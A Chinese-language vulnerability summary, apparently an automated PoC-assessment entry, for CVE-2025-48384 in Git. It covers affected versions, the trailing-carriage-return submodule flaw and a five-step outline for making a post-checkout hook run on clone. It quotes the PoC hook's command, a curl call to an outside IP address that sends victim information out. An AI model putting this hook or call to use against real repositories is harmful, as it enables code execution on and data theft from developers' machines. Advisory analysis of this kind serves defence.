## CVE-2025-48384-Git配置注入/代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/代码执行

**影响应用:** Git

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库,并执行含有 post-checkout hook的submodule 初始化

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。该漏洞源于 Git 在处理配置文件时，没有正确处理尾部的回车符（CR）。攻击者可以利用这一点，在子模块路径中添加尾部回车符，导致 Git 将子模块检出到错误的位置。如果攻击者在该位置放置一个符号链接，指向子模块的钩子目录，并子模块包含一个可执行的 `post-checkout` 钩子，那么在检出后，该钩子脚本就会被执行，从而实现远程代码执行。

**有效性：** 根据漏洞描述和提供的漏洞利用代码（`post-checkout` 脚本），可以判断该 POC 代码有效。脚本尝试从攻击者的服务器下载并执行代码。

**投毒风险：** 提供的 `post-checkout` 脚本本身就是漏洞利用的一部分，目的是执行恶意代码。如果该脚本是从攻击者控制的仓库中获取的，那么它自然会执行攻击者想要执行的操作。因此，从这个角度来说，可以说利用本身具有“投毒”性质。更准确地说，这不是传统的供应链投毒，而是漏洞利用的核心部分。脚本的功能是将受害者机器的信息发送到攻击者的服务器（ `curl http://120.46.135.127:50009?z`），因此本身不包含额外的、隐藏的恶意行为。该脚本本身就是后门，旨在执行任意命令。

**利用方式：**
1.  攻击者创建一个包含恶意配置的 Git 仓库，该配置在子模块路径中包含尾部回车符。
2.  攻击者在恶意仓库中设置一个符号链接，将修改后的子模块路径指向 Git 钩子目录。
3.  攻击者在子模块中包含一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该恶意仓库并执行 `git submodule update --init --recursive` 命令。
5.  Git 将子模块检出到错误的位置，符号链接生效，`post-checkout` 钩子脚本被执行，从而实现远程代码执行。

**风险评估：** 此漏洞风险极高，因为攻击者可以通过诱导用户克隆恶意仓库，在用户机器上执行任意代码。

**项目地址:** [altm4n/cve-2025-48384-hub](https://github.com/altm4n/cve-2025-48384-hub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)